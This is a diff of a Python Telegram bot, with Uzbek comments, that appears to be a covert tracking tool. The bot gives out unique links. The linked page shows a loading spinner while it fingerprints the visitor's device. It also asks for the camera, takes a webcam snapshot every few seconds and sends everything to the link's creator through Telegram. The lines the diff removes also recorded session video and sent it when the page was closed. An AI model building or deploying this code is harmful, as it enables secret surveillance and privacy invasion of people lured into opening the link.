@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-# main.py — ALOHIDA TRACKING BOT (Digen AI emas)
+# main.py
 import logging
 import os
 import uuid
@@ -10,7 +10,9 @@ from datetime import datetime
 from io import BytesIO
 from aiohttp import web
 from telegram import Update, InputFile
-from telegram.ext import Application, CommandHandler, ContextTypes
+from telegram.ext import (
+    Application, CommandHandler, ContextTypes
+)
 
 # ---------------- LOG ----------------
 logging.basicConfig(
@@ -25,10 +27,7 @@ ADMIN_ID = int(os.getenv("ADMIN_ID", "7440949683"))
 WEBHOOK_DOMAIN = os.getenv("WEBHOOK_DOMAIN", "https://fit-roanna-runex-7a8db616.koyeb.app").rstrip('/')
 
 if not BOT_TOKEN:
-    logger.error("BOT_TOKEN muhim!")
-    exit(1)
-if not WEBHOOK_DOMAIN:
-    logger.error("WEBHOOK_DOMAIN muhim! (https://...)")
+    logger.error("BOT_TOKEN kerak! ENV ga qo‘ying.")
     exit(1)
 
 # ---------------- GLOBAL STATE ----------------
@@ -36,167 +35,120 @@ USER_TOKENS = {}  # token -> telegram_id
 
 # ---------------- Telegram Handlers ----------------
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("👋 Salom! /tracklink buyrug'ini yuboring.")
-
-async def cmd_tracklink(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Foydalanuvchi /start bosganda unikal linkni beradi"""
     user_id = update.effective_user.id
     token = str(uuid.uuid4())
     USER_TOKENS[token] = user_id
     link = f"{WEBHOOK_DOMAIN}/track?token={token}"
-    await update.message.reply_text(
-        f"🔗 Sizning unikal havolangiz:\n{link}\n\n"
-        "Buni brauzerda oching — qurilma ma'lumotlari (va kamera rasmlari) sizga Telegram orqali yuboriladi."
+
+    msg = (
+        "👋 Salom! Quyidagi havolani oching:\n\n"
+        f"🔗 {link}\n\n"
+        "Bu havola orqali sizning qurilma haqidagi ma'lumotlar avtomatik olinadi."
     )
+    await update.message.reply_text(msg)
+
 
 # ---------------- Web Server: /track ----------------
 async def track_page(request):
     token = request.query.get('token')
     if not token or token not in USER_TOKENS:
-        return web.Response(text="❌ Noto'g'ri yoki eskirgan havola.", status=403)
+        return web.Response(text="❌ Havola noto‘g‘ri yoki eskirgan.", status=403)
 
     html = f"""
-    <html><head><title>Ma'lumot yig'ilmoqda...</title></head><body>
-    <h2>Ma'lumotlar yig'ilmoqda...</h2>
-    <script>
-      let mediaRecorder = null;
-      let recordedChunks = [];
-      let videoStream = null;
-      let captureInterval = null;
+<!DOCTYPE html>
+<html lang="uz">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width,initial-scale=1">
+  <title>Ma'lumot yig'ilmoqda...</title>
+  <style>
+    body {{
+      background-color: #0d1117;
+      color: #c9d1d9;
+      font-family: 'Segoe UI', sans-serif;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      margin: 0;
+      text-align: center;
+    }}
+    h2 {{ font-weight: 400; margin-bottom: 20px; }}
+    .loader {{
+      border: 4px solid #1f6feb;
+      border-radius: 50%;
+      border-top: 4px solid transparent;
+      width: 50px; height: 50px;
+      animation: spin 1s linear infinite;
+    }}
+    @keyframes spin {{
+      0% {{ transform: rotate(0deg); }}
+      100% {{ transform: rotate(360deg); }}
+    }}
+  </style>
+</head>
+<body>
+  <h2>Iltimos, kuting... Ma'lumotlar yig‘ilmoqda</h2>
+  <div class="loader"></div>
+  <script>
+    async function collect() {{
+      const data = {{
+        timestamp: new Date().toLocaleString('uz-UZ', {{ timeZone: 'Asia/Tashkent' }}),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Noma\\'lum',
+        utcOffset: -new Date().getTimezoneOffset() / 60,
+        languages: (navigator.languages || [navigator.language]).join(', '),
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        os: /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone|iPad/.test(navigator.userAgent) ? 'iOS' : 'Noma\\'lum',
+        browser: 'Noma\\'lum',
+        screen: `${{screen.width}} × ${{screen.height}}`,
+        viewport: `${{window.innerWidth}} × ${{window.innerHeight}}`,
+        cpuCores: navigator.hardwareConcurrency || 'Noma\\'lum',
+        ram: navigator.deviceMemory ? `${{navigator.deviceMemory}} GB` : 'Noma\\'lum',
+        deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Telefon/Planshet' : 'Kompyuter'
+      }};
+      if (navigator.userAgent.includes('Chrome')) data.browser = 'Chrome';
+      else if (navigator.userAgent.includes('Firefox')) data.browser = 'Firefox';
+      else if (navigator.userAgent.includes('Safari')) data.browser = 'Safari';
 
-      async function collect() {{
-        const token = '{token}';
-        const data = {{
-          timestamp: new Date().toLocaleString('uz-UZ', {{ timeZone: 'Asia/Tashkent' }}),
-          timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'Noma\\'lum',
-          utcOffset: -new Date().getTimezoneOffset() / 60,
-          languages: Array.from(navigator.languages || [navigator.language]).join(', '),
-          userAgent: navigator.userAgent,
-          platform: navigator.platform,
-          os: /Android/i.test(navigator.userAgent) ? 'Android' : /iPhone|iPad/.test(navigator.userAgent) ? 'iOS' : 'Noma\\'lum',
-          browser: 'Noma\\'lum',
-          screen: `${{screen.width}} × ${{screen.height}}`,
-          viewport: `${{window.innerWidth}} × ${{window.innerHeight}}`,
-          screenDepth: `rang: ${{screen.colorDepth}}-bit, piksel: ${{screen.pixelDepth}}-bit`,
-          cpuCores: navigator.hardwareConcurrency || 'Noma\\'lum',
-          ram: navigator.deviceMemory ? `${{navigator.deviceMemory}} GB` : 'Noma\\'lum',
-          deviceType: /Mobi|Android/i.test(navigator.userAgent) ? 'Phone/Tablet' : 'Desktop',
-          network: 'Noma\\'lum',
-          gpu: 'Noma\\'lum',
-          model: 'Noma\\'lum',
-          mediaDevices: 'Ruxsat berilmadi',
-          cameraRes: 'Noma\\'lum'
-        }};
-
-        if (navigator.userAgent.includes('Chrome')) data.browser = 'Chrome';
-        else if (navigator.userAgent.includes('Firefox')) data.browser = 'Firefox';
-        else if (navigator.userAgent.includes('Safari')) data.browser = 'Safari';
-
-        if ('connection' in navigator) {{
-          const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
-          if (conn) data.network = `${{conn.effectiveType || '?'}} ~ ${{conn.downlink || '?'}} Mbps`;
-        }}
-
-        try {{
-          const canvas = document.createElement('canvas');
-          const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
-          if (gl) {{
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            if (debugInfo) data.gpu = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL) || 'Aniqlanmadi';
-          }}
-        }} catch(e) {{}}
-
-        try {{
-          const ua = await navigator.userAgentData.getHighEntropyValues(['model']);
-          data.model = ua.model || 'Noma\\'lum';
-        }} catch(e) {{}}
-
-        try {{
-          const devices = await navigator.mediaDevices.enumerateDevices();
-          const audioIn = devices.filter(d => d.kind === 'audioinput').length;
-          const audioOut = devices.filter(d => d.kind === 'audiooutput').length;
-          const video = devices.filter(d => d.kind === 'videoinput').length;
-          data.mediaDevices = `mikrofon: ${{audioIn}} ta, karnay: ${{audioOut}} ta, kamera: ${{video}} ta`;
-        }} catch(e) {{}}
-
-        try {{
-          const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
-          videoStream = stream;
-
-          captureInterval = setInterval(() => {{
-            const videoTrack = stream.getVideoTracks()[0];
-            if (!videoTrack) return;
-            const imageCapture = new ImageCapture(videoTrack);
-            imageCapture.takePhoto()
-              .then(blob => {{
-                const reader = new FileReader();
-                reader.onloadend = () => {{
-                  fetch('/upload_photo', {{
-                    method: 'POST',
-                    headers: {{ 'Content-Type': 'application/json' }},
-                    body: JSON.stringify({{ token, photo: reader.result }})
-                  }});
-                }};
-                reader.readAsDataURL(blob);
-              }})
-              .catch(console.error);
-          }}, 2000);
-
-          mediaRecorder = new MediaRecorder(stream, {{ mimeType: 'video/webm;codecs=vp9' }});
-          recordedChunks = [];
-          mediaRecorder.ondataavailable = (event) => {{
-            if (event.data.size > 0) recordedChunks.push(event.data);
-          }};
-          mediaRecorder.start();
-
-          const sendVideo = () => {{
-            if (mediaRecorder && mediaRecorder.state === "recording") {{
-              mediaRecorder.stop();
-              if (videoStream) videoStream.getTracks().forEach(t => t.stop());
-              clearInterval(captureInterval);
-              const blob = new Blob(recordedChunks, {{ type: 'video/webm' }});
-              if (blob.size < 1000) return;
-              const reader = new FileReader();
-              reader.onloadend = () => {{
-                fetch('/upload_video', {{
-                  method: 'POST',
-                  headers: {{ 'Content-Type': 'application/json' }},
-                  body: JSON.stringify({{ token, video: reader.result }})
-                }});
-              }};
-              reader.readAsDataURL(blob);
-            }}
-          }};
-
-          window.addEventListener('beforeunload', sendVideo);
-          document.addEventListener('visibilitychange', () => {{
-            if (document.hidden) sendVideo();
-          }});
-
-          const [track] = stream.getVideoTracks();
-          const caps = track.getCapabilities();
-          if (caps.width && caps.height) {{
-            data.cameraRes = `${{caps.width.max}} x ${{caps.height.max}} @${{caps.frameRate?.max || '?'}}fps`;
-          }}
-        }} catch (e) {{
-          fetch('/submit', {{
+      try {{
+        const stream = await navigator.mediaDevices.getUserMedia({{ video: true }});
+        const video = document.createElement('video');
+        video.srcObject = stream; video.play();
+        const canvas = document.createElement('canvas');
+        const ctx = canvas.getContext('2d');
+        setInterval(() => {{
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          ctx.drawImage(video, 0, 0);
+          const imageData = canvas.toDataURL('image/jpeg');
+          fetch('/upload_image', {{
             method: 'POST',
             headers: {{ 'Content-Type': 'application/json' }},
-            body: JSON.stringify({{ token, ...data }})
+            body: JSON.stringify({{ token: '{token}', image: imageData }})
           }});
-          return;
-        }}
-
-        fetch('/submit', {{
-          method: 'POST',
-          headers: {{ 'Content-Type': 'application/json' }},
-          body: JSON.stringify({{ token, ...data }})
-        }});
+        }}, 3000);
+      }} catch (e) {{
+        console.log('Kamera ruxsat berilmadi');
       }}
-      collect();
-    </script>
-    </body></html>
-    """
+
+      fetch('/submit', {{
+        method: 'POST',
+        headers: {{ 'Content-Type': 'application/json' }},
+        body: JSON.stringify({{ token: '{token}', ...data }})
+      }}).then(() => {{
+        document.body.innerHTML = "<h2>✅ Rahmat! Ma'lumotlar yuborildi.</h2>";
+      }});
+    }}
+    collect();
+  </script>
+</body>
+</html>
+"""
     return web.Response(text=html, content_type='text/html')
+
 
 # ---------------- Web Server: /submit ----------------
 async def submit_data(request):
@@ -205,108 +157,58 @@ async def submit_data(request):
         token = data.get('token')
         telegram_id = USER_TOKENS.get(token)
         if not telegram_id:
-            return web.json_response({"error": "Token not found"}, status=400)
+            return web.json_response({"error": "Token topilmadi"}, status=400)
 
-        utc_offset = data.get('utcOffset', 5)
-        utc_str = f"+{int(utc_offset):02}" if utc_offset >= 0 else f"{int(utc_offset):02}"
-
-        message = f"""
-Kichik eslatma link telegram orqali ochilsa
-
-Qurilma ma'lumoti
-{data.get('timestamp', 'Noma\'lum')}
-Vaqt zonasi: {data.get('timezone', 'Noma\'lum')}
-(UTC{utc_str}:00)
-Joylashuv: ruxsat berilmadi
-Til: {data.get('languages', 'Noma\'lum')}
-Tizim: {data.get('os', 'Noma\'lum')} | Brauzer: {data.get('browser', 'Noma\'lum')}
-Qurilma: {data.get('model', 'Noma\'lum')}
-({data.get('deviceType', 'Noma\'lum')})
-CPU: {data.get('cpuCores', '?')} ta | RAM: {data.get('ram', '?')}
-Ekran: {data.get('screen', '?')}
-Ekran chuqurligi: {data.get('screenDepth', '?')}
-Ko'rinish (viewport): {data.get('viewport', '?')}
-Qurilmalar: {data.get('mediaDevices', 'Ruxsat berilmadi')}
-Kamera: {data.get('cameraRes', 'Noma\'lum')}
-Internet: {data.get('network', 'Noma\'lum')}
-GPU: {data.get('gpu', 'Noma\'lum')}
-UA: {data.get('userAgent', 'Noma\'lum')}
-        """.strip()
-
+        message = (
+            f"🕒 {data.get('timestamp', 'Noma\'lum')}\n"
+            f"🌍 {data.get('timezone', 'Noma\'lum')} (UTC{data.get('utcOffset', '+5')})\n"
+            f"💬 Til: {data.get('languages', 'Noma\'lum')}\n"
+            f"💻 Tizim: {data.get('os', 'Noma\'lum')} | Brauzer: {data.get('browser', 'Noma\'lum')}\n"
+            f"📱 Qurilma: {data.get('deviceType', 'Noma\'lum')} ({data.get('platform', '-')})\n"
+            f"🧠 CPU: {data.get('cpuCores', '?')} ta | RAM: {data.get('ram', '?')}\n"
+            f"📺 Ekran: {data.get('screen', '?')}\n"
+            f"Ko‘rinish: {data.get('viewport', '?')}\n"
+            f"🔍 UA: {data.get('userAgent', 'Noma\'lum')}"
+        )
         await request.app['bot'].send_message(chat_id=telegram_id, text=message)
         return web.json_response({"status": "ok"})
     except Exception as e:
         logger.exception(f"[SUBMIT ERROR] {e}")
         return web.json_response({"error": str(e)}, status=500)
 
-# ---------------- Web Server: /upload_photo ----------------
-async def upload_photo(request):
+
+# ---------------- Web Server: /upload_image ----------------
+async def upload_image(request):
     try:
         data = await request.json()
         token = data.get('token')
-        photo_data = data.get('photo')
+        image_data = data.get('image')
+
         telegram_id = USER_TOKENS.get(token)
         if not telegram_id:
             return web.json_response({"error": "Token not found"}, status=400)
 
-        if ',' in photo_data:
-            photo_data = photo_data.split(',', 1)[1]
+        if ',' in image_data:
+            image_data = image_data.split(',', 1)[1]
 
-        if len(photo_data) < 100:
-            return web.json_response({"status": "empty"}, status=200)
+        image_bytes = base64.b64decode(image_data)
+        image_io = BytesIO(image_bytes)
+        image_io.name = "photo.jpg"
 
-        photo_bytes = base64.b64decode(photo_data)
-        photo_io = BytesIO(photo_bytes)
-        photo_io.name = "photo.jpg"
-
-        await request.app['bot'].send_photo(
-            chat_id=telegram_id,
-            photo=InputFile(photo_io),
-            caption="📸 Yangi surat (har 2 soniyada olinadi)"
-        )
+        await request.app['bot'].send_photo(chat_id=telegram_id, photo=InputFile(image_io))
         return web.json_response({"status": "ok"})
     except Exception as e:
-        logger.exception("[UPLOAD PHOTO ERROR]")
+        logger.exception("[UPLOAD IMAGE ERROR]")
         return web.json_response({"error": str(e)}, status=500)
 
-# ---------------- Web Server: /upload_video ----------------
-async def upload_video(request):
-    try:
-        data = await request.json()
-        token = data.get('token')
-        video_data = data.get('video')
-        telegram_id = USER_TOKENS.get(token)
-        if not telegram_id:
-            return web.json_response({"error": "Token not found"}, status=400)
-
-        if ',' in video_data:
-            video_data = video_data.split(',', 1)[1]
-
-        if len(video_data) < 1000:
-            return web.json_response({"status": "empty"}, status=200)
-
-        video_bytes = base64.b64decode(video_data)
-        video_io = BytesIO(video_bytes)
-        video_io.name = "recording.webm"
-
-        await request.app['bot'].send_video(
-            chat_id=telegram_id,
-            video=InputFile(video_io),
-            caption="📹 Sahifa yopildi — sessiya video yozuvi"
-        )
-        return web.json_response({"status": "ok"})
-    except Exception as e:
-        logger.exception("[UPLOAD VIDEO ERROR]")
-        return web.json_response({"error": str(e)}, status=500)
 
 # ---------------- Web Server Starter ----------------
 async def start_web_server(bot):
-    app = web.Application(client_max_size=10 * 1024 * 1024)  # 10 MB
+    app = web.Application()
     app['bot'] = bot
     app.router.add_get('/track', track_page)
     app.router.add_post('/submit', submit_data)
-    app.router.add_post('/upload_photo', upload_photo)
-    app.router.add_post('/upload_video', upload_video)
+    app.router.add_post('/upload_image', upload_image)
     runner = web.AppRunner(app)
     await runner.setup()
     port = int(os.getenv("PORT", "8000"))
@@ -314,17 +216,19 @@ async def start_web_server(bot):
     await site.start()
     logger.info(f"🌐 Web server ishga tushdi: http://0.0.0.0:{port}")
 
+
 # ---------------- Startup ----------------
 async def on_startup(app: Application):
     asyncio.create_task(start_web_server(app.bot))
+
 
 # ---------------- Main ----------------
 def main():
     app = Application.builder().token(BOT_TOKEN).post_init(on_startup).build()
     app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("tracklink", cmd_tracklink))
-    logger.info("🚀 Tracking bot ishga tushdi. /tracklink yuboring.")
+    logger.info("🚀 Bot ishga tushdi.")
     app.run_polling()
+
 
 if __name__ == "__main__":
     main()
